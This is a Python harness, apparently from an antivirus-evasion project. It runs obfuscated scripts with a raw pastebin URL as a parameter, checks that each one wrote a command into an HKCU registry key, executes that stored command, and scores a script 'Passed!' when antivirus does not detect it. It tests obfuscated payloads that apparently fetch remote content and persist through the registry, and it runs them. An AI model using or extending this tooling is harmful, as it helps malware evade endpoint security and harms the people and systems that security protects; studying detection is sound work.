import sys
sys.path.append('../')
from Utility import *
import time


def test_file(path, params):
    file_name = get_file_name(path)
    reg_key_name = file_name
    file_name_report = "{0:40}".format(reg_key_name)

    command = prepare_command(path, [params[0], reg_key_name])
    
    cmd_lines = execute_cmd(command)

    result = True
    result_msg = ''

    if cmd_lines.find("ScriptContainedMaliciousContent") != -1:
        result = False
        result_msg = "Script detected as malicious"
    elif not exists_HKCU_registry_key(reg_key_name):
        result = False
        result_msg = "Registry key couldn't be created or was deleted by the Antivirus"
    else:
        key_value = get_HKCU_registry_key_value(reg_key_name) 
        try:
            out_command = execute_cmd(key_value)
        except Exception as runException:
            out_command = str(runException)
            if out_command.find("Access is denied") != -1:
                result = False
                result_msg = "Script detected as malicious"
        
        if out_command.find("Exception") != -1:
            result = False
            result_msg = "An exception has been thrown while executing obfuscated file" + cmd_lines

    result_str = "{0:15}".format("Passed!" if result else "Detected") + " " + result_msg

    print(file_name_report + result_str)

    return (file_name, result)


if __name__ == '__main__':

    # Get list of files
    DIR_GEN_OBF = ".\gen-obf\\"
    path_files = get_list_files(DIR_GEN_OBF, False)

    # Define params
    params = ['https://pastebin.com/raw/kHt3Zm7G']

    # Execute and get results
    results = test_files(path_files, params, test_file)
